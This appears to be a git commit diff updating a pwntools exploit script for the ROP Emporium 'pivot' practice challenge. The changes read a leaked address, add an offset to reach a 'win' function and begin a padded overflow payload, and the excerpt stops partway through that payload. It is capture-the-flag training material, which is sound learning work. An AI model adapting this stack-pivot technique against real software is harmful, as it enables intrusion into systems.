65639d290c1924723039e7565acb904f35016a68
F4t_c4t <97304629+wIn2-3z@users.noreply.github.com>
2023-03-10 03:32:11 +0700

    Update_WU

--- CustomChall/ROP_Emporium/pivot/script.py
+++ CustomChall/ROP_Emporium/pivot/script.py
@@ -1,22 +1,23 @@
 from pwn import*
 
+context.log_level       = "DEBUG"
+context.arch            = "amd64"
 
 elf = context.binary = ELF('./pivot', checksec=False)
 
 p = process("./pivot")
 
-#gdb.attach(p, gdbscript='''
+gdb.attach(p, gdbscript='''
 #b*pwnme+113
 #c
-#''')
+''')
 adget = elf.sym['usefulGadgets']
 
 p.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot: 0x")
+leak = int(p.recv(12),16)
+print("[+]LEAK:", hex(leak))
+win = leak + 0x1e2b71
 
-libc_base = int(p.recv(12),16) + 0x10f0
-win = libc_base + 0x1e1a81
-print("[+]LIBC_BASE:", hex(libc_base))
-print("[+]WIN:      ", hex(win))
 payload = flat(
     cyclic(0x28),
     win
